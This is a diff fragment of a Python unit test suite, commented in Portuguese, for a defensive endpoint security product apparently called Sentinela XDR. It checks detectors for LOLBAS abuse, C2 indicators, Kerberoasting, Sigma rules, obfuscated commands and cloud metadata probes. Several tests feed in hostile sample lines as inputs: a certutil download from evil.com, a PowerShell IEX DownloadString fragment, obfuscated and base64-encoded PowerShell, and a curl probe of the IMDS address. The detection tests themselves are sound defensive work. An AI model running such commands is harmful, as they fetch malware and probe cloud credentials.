+        self.assertTrue(res_bad3["blocked"])
+        self.assertEqual(res_bad3["rule_id"], "VSS-004")
+
+    def test_03_memory_rwx_hunter(self):
+        """Valida o caçador de páginas RWX e shellcode unbacked."""
+        from sentinel_core.memory_rwx_hunter import MemoryRWXHunter
+        rwx = MemoryRWXHunter()
+
+        status = rwx.get_status()
+        self.assertEqual(status["status"], "active")
+        self.assertGreaterEqual(status["beacon_signatures_loaded"], 4)
+
+        # Varredura do processo atual do Python
+        import os
+        res_self = rwx.scan_process_memory(os.getpid())
+        self.assertEqual(res_self["status"], "success")
+
+    def test_04_cisa_kev_vulnerability_engine(self):
+        """Valida a auditoria de vulnerabilidades KEV e fraquezas de configuração."""
+        from sentinel_core.cisa_kev_engine import CISAKEVEngine
+        kev = CISAKEVEngine()
+
+        audit = kev.run_vulnerability_audit()
+        self.assertEqual(audit["status"], "success")
+        self.assertGreaterEqual(audit["vulnerability_score"], 80)
+        self.assertIn("findings", audit)
+        self.assertGreaterEqual(len(audit["findings"]), 5)
+
+        # Teste de remediação
+        rem = kev.remediate_finding("KEV-005")
+        self.assertEqual(rem["status"], "success")
+
+
+
+class TestSTIXMISPLayer(unittest.TestCase):
+    """Testes unitários do motor STIX 2.1 / MISP CTI e do Threat Watchdog Daemon."""
+
+    def test_01_stix_bundle_parsing_and_indexing(self):
+        """Valida a indexação O(1) de objetos STIX 2.1."""
+        from sentinel_core.stix_misp_engine import STIXMISPEngine
+        engine = STIXMISPEngine()
+        status = engine.get_status()
+        self.assertEqual(status["status"], "active")
+        self.assertGreaterEqual(status["total_iocs"], 4)
+        self.assertGreaterEqual(status["ips_indexed"], 2)
+        self.assertGreaterEqual(status["domains_indexed"], 1)
+        self.assertGreaterEqual(status["hashes_indexed"], 1)
+
+    def test_02_stix_ioc_lookup(self):
+        """Valida a consulta rápida de IPs de C2, domínios e hashes."""
+        from sentinel_core.stix_misp_engine import STIXMISPEngine
+        engine = STIXMISPEngine()
+
+        # IP de C2 conhecido
+        match_ip = engine.lookup_ioc("185.220.101.5")
+        self.assertIsNotNone(match_ip)
+        self.assertTrue(match_ip["match"])
+        self.assertEqual(match_ip["type"], "ip")
+
+        # Domínio C2 conhecido
+        match_dom = engine.lookup_ioc("cobaltstrike-c2.ru")
+        self.assertIsNotNone(match_dom)
+        self.assertTrue(match_dom["match"])
+        self.assertEqual(match_dom["type"], "domain")
+
+        # Subdomínio de C2 conhecido
+        match_sub = engine.lookup_ioc("beacon1.cobaltstrike-c2.ru")
+        self.assertIsNotNone(match_sub)
+        self.assertTrue(match_sub["match"])
+
+        # Valor limpo
+        clean = engine.lookup_ioc("8.8.8.8")
+        self.assertIsNone(clean)
+
+    def test_03_stix_sync_feeds(self):
+        """Valida a sincronização com novos feeds CTI globais."""
+        from sentinel_core.stix_misp_engine import STIXMISPEngine
+        engine = STIXMISPEngine()
+        initial = engine.total_iocs_count
+        new_total = engine.sync_global_feeds()
+        self.assertGreaterEqual(new_total, initial)
+
+    def test_04_threat_watchdog_single_cycle(self):
+        """Valida a execução de um ciclo autônomo do ThreatWatchdogDaemon."""
+        from sentinel_core.stix_misp_engine import STIXMISPEngine
+        from sentinel_core.memory_rwx_hunter import MemoryRWXHunter
+        from sentinel_core.ransomware_vss_shield import RansomwareVSSShield
+        from sentinel_core.amsi_guard import AMSIScriptGuard
+        from sentinel_core.threat_watchdog_daemon import ThreatWatchdogDaemon
+
+        stix = STIXMISPEngine()
+        rwx = MemoryRWXHunter()
+        vss = RansomwareVSSShield()
+        amsi = AMSIScriptGuard()
+
+        watchdog = ThreatWatchdogDaemon(
+            rwx_hunter=rwx,
+            stix_engine=stix,
+            vss_shield=vss,
+            amsi_guard=amsi
+        )
+
+        res = watchdog.execute_single_cycle()
+        self.assertEqual(res["status"], "success")
+        self.assertEqual(res["cycle"], 1)
+        self.assertIn("findings_count", res)
+
+
+
+class TestEnterpriseEnginesSuite(unittest.TestCase):
+    """Testes unitários dos 8 novos motores de nível Enterprise do Sentinela XDR."""
+
+    def test_01_lolbas_guard(self):
+        """Valida o bloqueio de técnicas LOLBAS com certutil, mshta e rundll32."""
+        from sentinel_core.lolbas_guard import LOLBASGuard
+        lolbas = LOLBASGuard()
+
+        # Comando benigno
+        res_ok = lolbas.inspect_process_execution(r"notepad.exe C:\Users\report.txt")
+        self.assertFalse(res_ok["blocked"])
+
+        # Abuso de certutil para download de malware
+        res_bad = lolbas.inspect_process_execution("certutil.exe -urlcache -split -f http://evil.com/x.exe")
+        self.assertTrue(res_bad["blocked"])
+        self.assertEqual(res_bad["rule_id"], "LOLBAS-001")
+
+    def test_02_ransomware_honeyfiles(self):
+        """Valida as armadilhas tripwire de ransomware."""
+        from sentinel_core.ransomware_honeyfiles import RansomwareHoneyfiles
+        hf = RansomwareHoneyfiles(base_dir="test_honeyfiles_suite")
+        res = hf.check_integrity()
+        self.assertFalse(res["has_threat"])
+        self.assertEqual(res["status"], "secure")
+        self.assertGreaterEqual(res["total_monitored"], 3)
+
+    def test_03_itdr_kerberos_guard(self):
+        """Valida a detecção de Kerberoasting e DCSync."""
+        from sentinel_core.itdr_kerberos_guard import ITDRKerberosGuard
+        itdr = ITDRKerberosGuard()
+
+        # Detecção de Kerberoasting
+        res_kb = itdr.inspect_kerberos_ticket(spn="MSSQLSvc/db:1433", encryption_type="rc4-hmac", account_name="svc_sql")
+        self.assertTrue(res_kb["is_threat"])
+        self.assertEqual(res_kb["attack_type"], "KERBEROASTING")
+
+        # Detecção de DCSync
+        res_dc = itdr.inspect_ad_replication(source_ip="10.0.0.50", user_principal="fake_admin", is_domain_controller=False)
+        self.assertTrue(res_dc["is_threat"])
+        self.assertEqual(res_dc["attack_type"], "DCSYNC")
+
+    def test_04_live_forensics_dumper(self):
+        """Valida a geração de dumps forenses cirúrgicos."""
+        import os
+        from sentinel_core.live_forensics_dumper import LiveForensicsDumper
+        dumper = LiveForensicsDumper(output_dir="test_forensics_suite")
+        res = dumper.dump_and_analyze_process(os.getpid())
+        self.assertEqual(res["status"], "success")
+        self.assertIn("package", res)
+        self.assertIn("report", res)
+
+    def test_05_native_etw_sensor(self):
+        """Valida a ingestão de telemetria nativa ETW do Kernel."""
+        from sentinel_core.native_etw_sensor import NativeETWSensor
+        etw = NativeETWSensor()
+        status = etw.get_status()
+        self.assertEqual(status["status"], "active")
+        self.assertEqual(status["providers_count"], 3)
+
+        res = etw.ingest_kernel_event("Microsoft-Windows-Threat-Intelligence", "VirtualAllocRemote", 9999, {"target": 1000})
+        self.assertTrue(res["is_suspicious"])
+
+    def test_06_sigma_compiler(self):
+        """Valida a compilação e avaliação nativa de regras Sigma universais."""
+        from sentinel_core.sigma_compiler_engine import SigmaCompilerEngine
+        sigma = SigmaCompilerEngine()
+        status = sigma.get_status()
+        self.assertEqual(status["status"], "active")
+        self.assertGreaterEqual(status["compiled_rules_count"], 3)
+
+        res = sigma.evaluate_event({"CommandLine": "powershell.exe IEX(DownloadString)"})
+        self.assertTrue(res["has_match"])
+
+    def test_07_mini_nids_dpi(self):
+        """Valida o Mini-NIDS e inspeção profunda de pacotes."""
+        from sentinel_core.mini_nids_dpi import MiniNIDSDPI
+        nids = MiniNIDSDPI()
+
+        # Scanner de ataque
+        res_scanner = nids.inspect_http_traffic("Mozilla/5.0 sqlmap/1.5", "/test")
+        self.assertTrue(res_scanner["is_anomaly"])
+        self.assertEqual(res_scanner["scanner"], "sqlmap")
+
+    def test_08_cloud_k8s_guard(self):
+        """Valida a proteção de postura de nuvem e containers."""
+        from sentinel_core.cloud_k8s_guard import CloudK8sGuard
+        cloud = CloudK8sGuard()
+
+        # Tentativa de acesso a endpoint IMDS
+        res_imds = cloud.inspect_imds_metadata_query("169.254.169.254", "curl.exe", 1234)
+        self.assertTrue(res_imds["is_threat"])
+        self.assertEqual(res_imds["type"], "CLOUD_IMDS_SSRF_PROBE")
+
+        # Auditoria de postura
+        res_audit = cloud.audit_container_runtime()
+        self.assertEqual(res_audit["status"], "success")
+        self.assertEqual(res_audit["score"], 100)
+
+    def test_09_anti_invasion_suite(self):
+        """Valida os 5 novos motores soberanos de anti-invasão."""
+        from sentinel_core.hook_integrity_guard import HookIntegrityGuard
+        from sentinel_core.c2_beacon_hunter import C2BeaconHunter
+        from sentinel_core.token_armor_guard import TokenArmorGuard
+        from sentinel_core.reverse_shell_guard import ReverseShellGuard
+        from sentinel_core.portscan_disruptor import PortScanDisruptor
+
+        # 1. Hook Integrity Guard
+        hook_guard = HookIntegrityGuard()
+        self.assertTrue(hook_guard.get_status()["is_active"])
+        sim_hook = hook_guard.simulate_tamper_event()
+        self.assertEqual(sim_hook["severity"], "CRITICAL")
+        self.assertEqual(sim_hook["reason"], "UNAUTHORIZED_TRAMPOLINE_JMP")
+
+        # 2. C2 Beacon Hunter
+        c2_hunter = C2BeaconHunter()
+        self.assertTrue(c2_hunter.get_status()["is_active"])
+        sim_c2 = c2_hunter.simulate_c2_stream()
+        self.assertIn(sim_c2["pattern_type"], ["JITTERED_C2_HEARTBEAT", "STRICT_PERIODIC_BEACON"])
+        self.assertGreaterEqual(sim_c2["beacon_score"], 70.0)
+
+        # 3. Token Armor Guard
+        token_armor = TokenArmorGuard()
+        self.assertTrue(token_armor.get_status()["is_active"])
+        sim_token = token_armor.simulate_potato_attack()
+        self.assertEqual(sim_token["attack_type"], "POTATO_PRIVILEGE_ESCALATION")
+
+        # 4. Reverse Shell Guard
+        rev_shell = ReverseShellGuard()
+        self.assertTrue(rev_shell.get_status()["is_active"])
+        sim_shell = rev_shell.simulate_reverse_shell()
+        self.assertEqual(sim_shell["severity"], "CRITICAL")
+
+        # 5. PortScan Disruptor
+        portscan = PortScanDisruptor()
+        self.assertTrue(portscan.get_status()["is_active"])
+        sim_scan = portscan.simulate_stealth_scan("203.0.113.99")
+        self.assertEqual(sim_scan["mitre"], "T1046")
+        self.assertGreaterEqual(sim_scan["ports_count"], 5)
+
+    def test_10_strategic_improvements_suite(self):
+        """Valida o pacote de melhorias estratégicas: Árvore de Processos, Ofuscação IA, Broadcast de IOCs e Isolamento Granular."""
+        from sentinel_core.command_obfuscation_classifier import CommandObfuscationClassifier
+        from sentinel_core.process_guard import EDRProcessGuard
+        from sentinel_core.zero_trust_wfp import ZeroTrustNetworkEngine
+        from multiagent.agent import MultiAgentClient
+        from multiagent.config import MultiAgentConfig
+        from sentinel_api import app as flask_api_app
+
+        # 1. Classificador de Ofuscação de Comandos
+        classifier = CommandObfuscationClassifier()
+        legit = classifier.analyze_command("notepad.exe C:\\relatorio.txt")
+        self.assertFalse(legit["is_obfuscated"])
+        self.assertEqual(legit["risk_level"], "LOW")
+
+        obf_caret = classifier.analyze_command("c^m^d.e^x^e /c s^e^t p=1")
+        self.assertIn("CMD_CARET_ESCAPE_INJECTION", " ".join(obf_caret["indicators"]))
+
+        obf_backtick = classifier.analyze_command("p`o`w`e`r`s`h`e`l`l.exe -NoP -w hidden")
+        self.assertIn("POWERSHELL_BACKTICK_OBFUSCATION", " ".join(obf_backtick["indicators"]))
+
+        obf_b64 = classifier.analyze_command("powershell.exe -enc aW52b2tlLWV4cHJlc3Npb24gImhlbGxvIg==")
+        self.assertIn("BASE64_ENCODED_COMMAND_EXECUTION", " ".join(obf_b64["indicators"]))
+        self.assertGreaterEqual(obf_b64["score"], 0.40)
+
+        # 2. Árvore de Processos e Linhagem Forense
+        edr = EDRProcessGuard()
+        tree = edr.get_process_tree(mode="all")
+        self.assertEqual(tree["status"], "success")
+        self.assertGreaterEqual(len(tree["nodes"]), 1)
+
+        lineage = edr.get_process_lineage(os.getpid())
+        self.assertEqual(lineage["status"], "success")
+        self.assertEqual(lineage["target"]["pid"], os.getpid())
+        self.assertGreaterEqual(lineage["lineage_depth"], 1)
+
+        # 3. Isolamento Granular com Canal de Gestão Preservado
+        ztna_wfp = ZeroTrustNetworkEngine()
+        ztna_wfp.configure_management_channel(ips=["127.0.0.1"], ports=[5000, 8000])
+        res_iso = ztna_wfp.isolate_host_granular(reason="Teste SOC", preserve_management=True)
+        self.assertTrue(res_iso["host_isolated"])
+        self.assertTrue(res_iso["preserve_management"])
+
+        # Tráfego na porta de gestão 5000 deve ser PERMITIDO
+        mgmt_pkt = ztna_wfp.inspect_packet("127.0.0.1", "127.0.0.1", 5000, "python.exe")
+        self.assertEqual(mgmt_pkt["action"], "ALLOW")
+        self.assertEqual(mgmt_pkt["bypass_reason"], "MANAGEMENT_CHANNEL_PRESERVED")
+
+        # Tráfego normal na porta 445 deve ser BLOQUEADO pelo isolamento
+        blocked_pkt = ztna_wfp.inspect_packet("10.0.0.5", "192.168.1.50", 445, "powershell.exe")
+        self.assertEqual(blocked_pkt["action"], "BLOCK")
+        self.assertEqual(blocked_pkt["reason"], "HOST_UNDER_EMERGENCY_ISOLATION")
+
+        # 4. Defesa Colaborativa Distribuída (Broadcast de IOCs)
+        cfg = MultiAgentConfig(agent_id="test-node-alpha", role="agent", hub_url="http://127.0.0.1:5000")
+        client = MultiAgentClient(cfg)
+        b_res = client.broadcast_threat_ioc("ip", "198.51.100.99", severity="CRITICAL", reason="C2 Ativo")
+        self.assertEqual(b_res["status"], "success")
+        self.assertEqual(b_res["ioc"]["value"], "198.51.100.99")
+
+        # 5. Validação dos Endpoints REST
+        with flask_api_app.test_client() as api_client:
+            r_tree = api_client.get("/api/edr/process-tree")
+            self.assertEqual(r_tree.status_code, 200)
+
+            r_lin = api_client.get(f"/api/edr/process/{os.getpid()}/lineage")
+            self.assertEqual(r_lin.status_code, 200)
+
+            r_obf = api_client.post("/api/ai/command-analysis", json={"cmdline": "c^m^d /c s^e^t"})
+            self.assertEqual(r_obf.status_code, 200)
+            self.assertIn("analysis", r_obf.get_json())
+
+            r_ioc = api_client.post("/api/multiagent/broadcast-ioc", json={"ioc_type": "ip", "value": "203.0.113.88", "reason": "Teste"})
+            self.assertEqual(r_ioc.status_code, 200)
+
+            r_gran = api_client.post("/api/ztna/granular-isolation", json={"reason": "Broca de Teste SOC", "preserve_management": True})
+            self.assertEqual(r_gran.status_code, 200)
+
+    def test_11_audit_and_service_orchestration_suite(self):
+        """Audita e valida a sincronização de todos os motores soberanos no ThreatWatchdog, Service e API."""
+        from sentinel_core.threat_watchdog_daemon import ThreatWatchdogDaemon
+        from sentinel_core.c2_beacon_hunter import C2BeaconHunter
+        from sentinel_core.byovd_guard import BYOVDGuard
+        from sentinel_core.anti_hollowing_guard import AntiHollowingGuard
+        from sentinel_core.lsass_guard import LSASSArmorGuard
+        from sentinel_core.memory_rwx_hunter import MemoryRWXHunter
+        from sentinel_core.ransomware_honeyfiles import RansomwareHoneyfiles
+        from sentinel_core.stix_misp_engine import STIXMISPEngine
+        from sentinel_core.ransomware_vss_shield import RansomwareVSSShield
+        from sentinel_core.amsi_guard import AMSIScriptGuard
+        from sentinel_api import init_api
+        import sentinel_api
+
+        # 1. Validação do ThreatWatchdogDaemon com todos os 10 passos integrados
+        logger = SecurityEventLogger()
+        rwx = MemoryRWXHunter(logger_instance=logger)
+        stix = STIXMISPEngine(logger_instance=logger)
+        vss = RansomwareVSSShield(logger_instance=logger)
+        amsi = AMSIScriptGuard(logger_instance=logger)
+        c2 = C2BeaconHunter(logger_instance=logger)
+        byovd = BYOVDGuard(logger_instance=logger)
+        hollow = AntiHollowingGuard(logger_instance=logger)
+        lsass = LSASSArmorGuard(logger_instance=logger)
+        honey = RansomwareHoneyfiles(logger_instance=logger)
+
+        watchdog = ThreatWatchdogDaemon(
+            rwx_hunter=rwx,
+            stix_engine=stix,
+            vss_shield=vss,
+            amsi_guard=amsi,
+            c2_hunter=c2,
+            byovd_guard=byovd,
+            anti_hollowing_guard=hollow,
+            lsass_guard=lsass,
+            honeyfiles_guard=honey
+        )
+        self.assertIsNotNone(watchdog.c2_hunter)
+        self.assertIsNotNone(watchdog.byovd_guard)
+        self.assertIsNotNone(watchdog.anti_hollowing_guard)
+        self.assertIsNotNone(watchdog.lsass_guard)
+
+        # Executa ciclo completo de auditoria
+        cycle_res = watchdog.execute_single_cycle()
+        self.assertEqual(cycle_res["status"], "success")
+        self.assertEqual(cycle_res["cycle"], 1)
+        self.assertIn("findings_count", cycle_res)
+
+        # 2. Validação individual dos métodos de auditoria
+        c2_res = c2.analyze_beaconing_patterns()
+        self.assertIsInstance(c2_res, list)
+
+        hollow_res = hollow.scan_system_processes_integrity()
+        self.assertIsInstance(hollow_res, list)
+
+        lsass_res = lsass.audit_lsass_access()
+        self.assertIsInstance(lsass_res, list)
+
+        byovd_res = byovd.audit_installed_services_registry()
+        self.assertIsInstance(byovd_res, list)
+
+        # 3. Validação do contrato de injeção init_api
+        init_api(
+            byovd_guard=byovd,
+            anti_hollowing_guard=hollow,
+            lsass_guard=lsass,
+            rwx_hunter=rwx,
+            honeyfiles_guard=honey
+        )
+        self.assertEqual(sentinel_api.byovd_guard_instance, byovd)
+        self.assertEqual(sentinel_api.anti_hollowing_instance, hollow)
+        self.assertEqual(sentinel_api.lsass_guard_instance, lsass)
+        self.assertEqual(sentinel_api.rwx_hunter_instance, rwx)
+        self.assertEqual(sentinel_api.honeyfiles_guard_instance, honey)
+
+        # 4. Validação da inicialização do SentinelBackgroundDaemon
+        from sentinela_service import SentinelBackgroundDaemon
+        daemon = SentinelBackgroundDaemon()
+        self.assertFalse(daemon.is_running)
+        self.assertIsNotNone(daemon.watchdog)
 
 
 if __name__ == "__main__":
